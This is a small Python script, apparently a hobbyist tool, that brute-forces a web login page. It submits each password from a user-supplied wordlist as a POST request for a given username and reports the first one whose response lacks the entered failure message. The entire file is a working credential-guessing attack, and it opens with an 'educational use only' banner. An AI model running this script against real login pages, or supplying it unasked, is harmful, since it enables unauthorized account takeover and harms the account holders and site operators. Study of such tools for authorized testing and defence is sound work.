import requests

# Warning message for aid assistance only
print ("\033[1;31m[!] Educational use only. Authorized testing required.  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "  " "   ramad0na")

# Requesting the login page link from the user
target = input("\033[1;39mEnter Login Page Url: ")
print (target)
# Verify the link (http or https)
if not target.startswith(("http://", "https://")):
    print("[-] Invalid URL format. Use http:// or https://")
    exit()

# Request to enter username
username = input("\033[1;39mEnter Username: ")
print (username)

# Enter the text of the error message that appears when logging in incorrectly.
fail_message = input("\033[1;39mEnter Failure Message Text: ")

# Creating a dictionary of the data to be sent in a POST request
data_dictionary = {
    "username": username,       # Username
    "password": "",             # The password will be changed during the attack.
    "Login": "submit"           # Login button (optional depending on the page)
}

# Request to enter the path to the wordlist file
wordlist_path = input("Enter Wordlist Path: ")
with open(wordlist_path, "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dictionary["password"] = word

        response = requests.post(target, data=data_dictionary, timeout=5)

# If no failure message appears → the password is correct
        if fail_message not in response.text:
            print("[+] Found the password --> " + word)
            exit()

print("\033[1;37[+] The Program Is Done.")
